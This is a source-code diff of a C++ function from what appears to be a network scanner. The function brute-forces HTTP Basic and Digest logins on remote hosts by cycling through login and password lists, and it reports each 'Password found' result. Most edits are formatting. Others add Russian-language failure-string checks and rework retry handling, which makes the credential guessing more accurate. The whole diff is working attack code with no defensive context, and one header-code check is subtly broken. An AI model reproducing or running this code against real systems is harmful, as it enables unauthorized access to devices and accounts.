@@ -388,7 +388,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	int bTO;
 	bool goon = false;
 	char hRqst[REQUEST_MAX_SIZE] = {0};
-	char headerMsg[REQUEST_MAX_SIZE] = {0};
+	char headerMsg[REQUEST_MAX_SIZE] = { 0 };
 	char hMsgR[512] = {0};
 
 	strcpy(hRqst, "GET ");
@@ -454,7 +454,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					int x = 1;
 					int xx = 0;
 
-					while(xx < 512)
+					while (xx < REQUEST_MAX_SIZE)
 					{
 						x = recvWT(sock, hMsgR, sizeof(hMsgR), gTimeOut + 5, &bTO);
 						if(x <= 0) break;
@@ -491,6 +491,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		&& strstr(headerMsg, ".0 401") == NULL
 		&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
 		&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
+		&& strstr(headerMsg, "неправильны") == NULL && strstr(headerMsg, "Неправильны") == NULL
+		&& strstr(headerMsg, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL
 		)
 	{
 		if(strstri(headerMsg, "400 Bad") != NULL)
@@ -568,9 +570,9 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	for(int i = 0; i < MaxLogin; i++)
 	{
 		if(globalScanFlag == false) break;
-		for(int j = 0; j < MaxPass; j++)
+		for (int j = 0; j < MaxPass; j++)
 		{
-			if(globalScanFlag == false) break;
+			if (globalScanFlag == false) break;
 
 			ZeroMemory(request, REQUEST_MAX_SIZE);
 			ZeroMemory(curLogin, sizeof(curLogin));
@@ -578,7 +580,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			strcpy(curLogin, loginLst[i]);
 			strcpy(curPass, passLst[j]);
 
-			if(strcmp(method, "[DIGEST]") == 0 && strstr(localBuff, "nonce=") != NULL)
+			if (strcmp(method, "[DIGEST]") == 0 && strstr(localBuff, "nonce=") != NULL)
 			{
 				ZeroMemory(attribute, sizeof(attribute));
 				strcpy(attribute, _getAttribute(localBuff, "WWW-Authenticate:"));
@@ -587,7 +589,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				ZeroMemory(realm, sizeof(realm));
 				strcpy(realm, _getAttributeValue(attribute, "realm=", ip, port));
 				ZeroMemory(qop, sizeof(qop));
-				if(strstri(attribute, "qop") != NULL)
+				if (strstri(attribute, "qop") != NULL)
 				{
 					strcpy(qop, _getAttributeValue(attribute, "qop=", ip, port));
 				};
@@ -596,19 +598,19 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, path);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
-				if(port != 80){
+				if (port != 80){
 					strcat(request, ":");
-					char tbuff[16] = {0};
-                    sprintf(tbuff, "%d", port);
-                    strcat(request, tbuff);
+					char tbuff[16] = { 0 };
+					sprintf(tbuff, "%d", port);
+					strcat(request, tbuff);
 				};
-				if(cookieLen != 0)
+				if (cookieLen != 0)
 				{
 					strcat(request, "\r\nCookie: ");
 					strcat(request, cookie);
 				};
-				
-				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Digest username=\"");					
+
+				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Digest username=\"");
 				strcat(request, curLogin);
 				strcat(request, "\", realm=\"");
 				strcat(request, realm);
@@ -618,7 +620,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, path);
 				strcat(request, "\", qop=auth, response=\"");
 				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce, "10000001", "9d531d56796e0dc9", qop));
-				if(strstri(attribute, "opaque") != NULL)
+				if (strstri(attribute, "opaque") != NULL)
 				{
 					ZeroMemory(opaque, sizeof(opaque));
 					strcpy(opaque, _getAttributeValue(attribute, "opaque=", ip, port));
@@ -639,54 +641,55 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, path);
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
-				if(port != 80){
+				if (port != 80){
 					strcat(request, ":");
-					char tbuff[16] = {0};
-                    sprintf(tbuff, "%d", port);
-                    strcat(request, tbuff);
+					char tbuff[16] = { 0 };
+					sprintf(tbuff, "%d", port);
+					strcat(request, tbuff);
 				};
-				if(cookieLen != 0)
+				if (cookieLen != 0)
 				{
 					strcat(request, "\r\nCookie: ");
 					strcat(request, cookie);
 				};
-				
-				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic ");					
+
+				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic ");
 				strcat(request, encoded.c_str());
 				strcat(request, "\r\nConnection: close\r\n\r\n");
 			};
 
-			if(port == 443)
+			if (port == 443)
 			{
 				ZeroMemory(recvBuff, sizeof(recvBuff));
-				if(BALogSwitched) stt->doEmitionBAData("Probing SSL:BA " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(tPass) + ";");
+				if (BALogSwitched) stt->doEmitionBAData("Probing SSL:BA " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(tPass) + ";");
 				_baSSLWorker(ip, request, recvBuff);
 				dataSz = strlen(recvBuff);
 			}
 
-            else
+			else
 			{
-				SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+				SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 				cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 
-				if(cCode == SOCKET_ERROR) {
+				if (cCode == SOCKET_ERROR) {
 
 					int errorCode = WSAGetLastError();
-                    if(errorCode == WSAENOTSOCK) {
+					if (errorCode == WSAENOTSOCK) {
 
-                        while(errorCode == WSAENOTSOCK)
+						while (errorCode == WSAENOTSOCK)
 						{
-                            if(gDebugMode) stt->doEmitionDebugFoundData("[BA][ENOTSOCK] - [" + QString(ip) + ":" + QString::number(port) + "]");
+							if (gDebugMode) stt->doEmitionDebugFoundData("[BA][ENOTSOCK] - [" + QString(ip) + ":" + QString::number(port) + "]");
 							CSSOCKET(sock);
-							sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+							sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 							cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
 							errorCode = WSAGetLastError();
 						};
-					} else {
+					}
+					else {
 
 						CSSOCKET(sock);
 
-                        if(errorCode != WSAETIMEDOUT)
+						if (errorCode != WSAETIMEDOUT)
 						{
 							stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(errorCode) + "]");
 						};
@@ -695,18 +698,19 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					};
-				} else {
+				}
+				else {
 
 					int x = 1;
 					Activity += strlen(request);
 
-					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 	
+					if (send(sock, request, strlen(request), 0) != SOCKET_ERROR)
 					{
-						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
+						if (MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
 						dataSz = 0;
 						ZeroMemory(recvBuff2, sizeof(recvBuff2));
 						ZeroMemory(recvBuff, sizeof(recvBuff));
-						while (x > 0 && dataSz < 3384)				
+						while (x > 0 && dataSz < 3384)
 						{
 							ZeroMemory(recvBuff2, sizeof(recvBuff2));
 							x = recvWT(sock, recvBuff2, sizeof(recvBuff2), gTimeOut + 5, &bTO);
@@ -715,7 +719,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 							Activity += x;
 							strncat(recvBuff, recvBuff2, x);
 						};
-						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
+						if (BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
 					}
 					else
 					{
@@ -730,10 +734,10 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				CSSOCKET(sock);
 			};
 
-			
-			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));
 
-			if(dataSz == 0)
+			if (MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));
+
+			if (dataSz == 0)
 			{
 				stt->doEmitionBAData("[BA] No reply from: " + QString(ip) + "; Repeating...");
 				--j;
@@ -744,19 +748,34 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				++passCounter;
 			};
 
-			if(strcmp(method, "[DIGEST]") == 0)
+			if (strcmp(method, "[DIGEST]") == 0)
 			{
 				ZeroMemory(localBuff, sizeof(localBuff));
 				strcpy(localBuff, recvBuff);
 			};
-			
-			if(strstri(recvBuff, "http/1.1 401") == NULL
-				|| strstri(recvBuff, "http/1.0 401") == NULL
-				)
+			if (strstri(recvBuff, "http/1.1 401") != NULL
+				|| strstri(recvBuff, "http/1.0 401") != NULL)
 			{
-				///dummy///
-			}
-			else if(strstri(recvBuff, "503 service unavailable") != NULL 
+				Sleep(200);
+			} else
+			//if(strstri(recvBuff, "http/1.1 401") == NULL
+			//	|| strstri(recvBuff, "http/1.0 401") == NULL
+			//	)
+			//{
+			//	if ((strstri(recvBuff, "200 ok") != NULL
+			//		|| strstri(recvBuff, "http/1.0 200") != NULL
+			//		|| strstri(recvBuff, "http/1.1 200") != NULL
+			//		)
+			//		&& strstr(headerMsg, "неправильны") == NULL 
+			//		&& strstr(headerMsg, "Неправильны") == NULL
+			//		&& strstr(headerMsg, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL)
+			//	{
+			//	}
+			//	stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");
+			//	Sleep(200);
+			//	///dummy///
+			//}
+			if(strstri(recvBuff, "503 service unavailable") != NULL 
 				|| strstri(recvBuff, "http/1.1 503") != NULL 
 				|| strstri(recvBuff, "http/1.0 503") != NULL
 				|| strstr(recvBuff, "400 BAD_REQUEST") != NULL
@@ -783,13 +802,16 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
 			}
-			else if( (strstri(recvBuff, "200 ok") != NULL 
+			else if ((strstri(recvBuff, "200 ok") != NULL
 				|| strstri(recvBuff, "http/1.0 200") != NULL
+				|| strstri(recvBuff, "http/1.1 200") != NULL
 				)
 				&& strstri(recvBuff, "http/1.1 401 ") == NULL
 				&& strstri(recvBuff, "http/1.0 401 ") == NULL
 				&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
 				&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
+				&& strstr(headerMsg, "неправильны") == NULL && strstr(headerMsg, "Неправильны") == NULL
+				&& strstr(headerMsg, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL
 				&& dataSz > 13
 				) 
 			{
@@ -812,32 +834,36 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			}
 			else
 			{
-				ZeroMemory(pass, sizeof(pass));
-				strcpy(pass, ip);
-				strcat(pass, " - Password found: ");
-				strcat(pass, tPass);
-				isActive = 0;
-				char *pt1 = strstr(recvBuff, " ");
-				if(pt1 != NULL)
+				if (strstri(headerMsg, "неправильны") == NULL
+					&& strstri(headerMsg, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL)
 				{
-					char *pt2 = strstr(pt1 + 1, " ");
-					if(pt2 != NULL)
+					ZeroMemory(pass, sizeof(pass));
+					sprintf(pass, "%s - Password found: %s", ip, tPass);
+					char *pt1 = strstr(recvBuff, " ");
+					if(pt1 != NULL)
 					{
-						int sz = pt2 - pt1 - 1;
-						char tempHeaderCode[16] = {0};
-						strncpy(tempHeaderCode, pt1 + 1, sz);
+						char *pt2 = strstr(pt1 + 1, " ");
+						if(pt2 != NULL)
+						{
+							int sz = pt2 - pt1 - 1;
+							char tempHeaderCode[16] = {0};
+							strncpy(tempHeaderCode, pt1 + 1, sz);
 						
-						if(strcmp(tempHeaderCode, "302") == 0 && strcmp(tempHeaderCode, "200") == 0) stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (" + QString(tempHeaderCode) + ") IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");
-						strcpy(lps.login, curLogin);
-						strcpy(lps.pass, curPass);
-						return lps;
+							if(strcmp(tempHeaderCode, "302") == 0 && strcmp(tempHeaderCode, "200") == 0) stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (" + QString(tempHeaderCode) + ") IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");
+							strcpy(lps.login, curLogin);
+							strcpy(lps.pass, curPass);
+							return lps;
+						};
 					};
-				};
-				stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
-				strcpy(lps.login, curLogin);
-				strcpy(lps.pass, curPass);
-				return lps;
+					stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
+					strcpy(lps.login, curLogin);
+					strcpy(lps.pass, curPass);
+					isActive = 0;
+					return lps;
+				}
+				else Sleep(200);
 			};
+
 			if(strstr(recvBuff, "Set-Cookie:") != NULL)
 			{
 				ZeroMemory(cookie, COOKIE_MAX_SIZE);
